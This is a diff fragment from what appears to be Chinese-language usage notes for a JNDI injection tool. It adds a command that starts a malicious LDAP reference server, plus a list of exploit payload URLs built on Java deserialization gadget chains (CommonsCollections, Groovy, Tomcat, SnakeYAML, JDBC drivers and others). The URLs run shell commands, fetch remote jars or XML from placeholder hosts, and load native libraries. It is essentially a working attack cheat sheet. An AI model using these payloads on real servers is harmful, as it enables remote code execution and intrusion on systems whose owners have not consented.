@@ -166,7 +166,29 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 ldap:
 1. 启动LDAP服务，后面写要执行的语句
-java -cp jndi_tool.jar jndi.LDAPRefServer 1099
+> java -cp jndi_tool.jar jndi.LDAPRefServer 1099 host="0.0.0.0"
+[-] Payloads: CommonsBeanutils1-2,CommonsCollections1-10,CommonsCollectionsK1-4,Groovy1,Clojure,JSON1,Spring1-2,URLDNS,file,tomcat,groovy
+[-] etc: ldap://0.0.0.0:1099/CommonsBeanutils1/curl x.cn
+[-] etc: ldap://0.0.0.0:1099/CommonsCollections1/bash=ping x.cn
+[-] etc: ldap://0.0.0.0:1099/URLDNS/x.cn
+[-] etc: ldap://0.0.0.0:1099/file/base64data_filename
+[-] etc: ldap://0.0.0.0:1099/el/whomai
+[-] etc: ldap://0.0.0.0:1099/groovy/whomai
+[-] etc: ldap://0.0.0.0:1099/mlet/http://xx.xx
+[-] etc: ldap://0.0.0.0:1099/groovyload/http://xx.xx
+[-] etc: ldap://0.0.0.0:1099/snakeyaml/http://xx.xx/x.jar
+[-] etc: ldap://0.0.0.0:1099/xstream/curl x.dns
+[-] etc: ldap://0.0.0.0:1099/mvel/whoami
+[-] etc: ldap://0.0.0.0:1099/loadlib//tmp/nativeLib_name
+[-] etc: ldap://0.0.0.0:1099/tomcatxxe/http://xx.xx/xxe.xml
+
+jdbc:
+[-] etc: ldap://0.0.0.0:1099/tomcatdbcp/whoami
+[-] etc: ldap://0.0.0.0:1099/tomcatdbcp2/whoami
+[-] etc: ldap://0.0.0.0:1099/commondbcp/whoami
+[-] etc: ldap://0.0.0.0:1099/commondbcp2/whoami
+[-] etc: ldap://0.0.0.0:1099/tomcatjdbc/whoami
+[-] etc: ldap://0.0.0.0:1099/druidjdbc/whoami
 
 2. 发送请求包
 POST /test HTTP/1.1
